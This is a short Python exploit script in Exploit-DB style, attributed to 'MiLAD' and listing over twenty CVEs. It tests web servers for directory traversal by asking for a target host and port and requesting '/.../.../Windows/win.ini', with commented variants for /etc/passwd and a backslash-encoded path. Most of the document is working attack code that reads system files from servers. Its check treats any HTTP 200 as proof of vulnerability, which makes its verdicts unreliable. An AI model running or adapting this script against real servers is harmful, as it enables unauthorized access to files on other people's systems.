# Exploit Title: Web Server Directory Traversal Arbitrary File Access
# Date: 2018-11-11
# Exploit Author: MiLAD
# Vendore Homepage:
# Software Link:
# Version:
# Tested on:
# CVE: CVE-2000-0920, CVE-2007-6483, CVE-2008-5315, CVE-2010-1571, CVE-2010-3459, CVE-2010-3460, CVE-2010-3487, CVE-2010-3488, CVE-2010-3743, CVE-2010-4181, CVE-2011-1900, CVE-2011-2524, CVE-2011-4788, CVE-2012-0697, CVE-2012-1464, CVE-2012-5100, CVE-2012-5335, CVE-2012-5344, CVE-2012-5641, CVE-2013-2619, CVE-2013-3304, CVE-2014-3744
# POC: read some file on server
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import requests
import sys
import os
from colorama import init
init()
from colorama import Fore, Back, Style
from platform import system as system_name # Returns the system/OS name
from os import system as system_call       # Execute a shell command


# path = '%5c...%5c...%5c...%5c...%5c...%5c...%5c...%5c...%5c...%5cwindows/win.ini'

def clear_screen():
    """
    Clears the terminal screen.
    """
    # Clear command as function of OS
    command = "cls" if system_name().lower()=="windows" else "clear"
    # Action
    system_call(command)
h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'}
def usage():
	print (Style.BRIGHT+Back.WHITE)
	print (Style.DIM+Fore.BLACK+"Directory Traversal Exploit")
	print (Style.DIM+Back.BLACK+Fore.RED+"example : python exploit.py\nPlease Enter Target URL: target.com\nPlease Enter Target Port Number: 8081")
	print (Style.RESET_ALL)
def main():
	try:
		url = raw_input('Please Enter Target URL: ')
		port = raw_input('Please Enter Target Port Number: ')
		# os_family == 'windows':
		path = '/.../.../.../.../.../.../.../.../.../Windows/win.ini'
		# os_family == 'linux':
		# path = '/.../.../.../.../.../.../.../.../.../etc/passwd'
		if url == '' or port == '':
			usage()
		else:
			url2 ='http://' + url + ':' + port + path
			print (Style.DIM+Back.WHITE+Fore.BLACK+url2)
			print (Style.RESET_ALL)  
			r = requests.get(url2, headers=h, verify=False, timeout=10)
			if r.status_code == 200:
				print (Style.DIM+Back.BLACK+Fore.RED+'\t \t \t This Host is Vulnerable')
				print (Style.RESET_ALL) 
			elif r.status_code != 200:
				print (Style.DIM+Back.BLACK+Fore.GREEN+'This Host is not Vulnerable') 
				print (Style.RESET_ALL) 
	except Exception as e:
		print (Style.DIM+Back.BLACK+Fore.RED+'Something is wrong Please check URL , Port and Host')
try:
	if __name__ == '__main__':
		clear_screen()
		main()
	else:
		usage()
except KeyboardInterrupt as e:
	sys.exit()
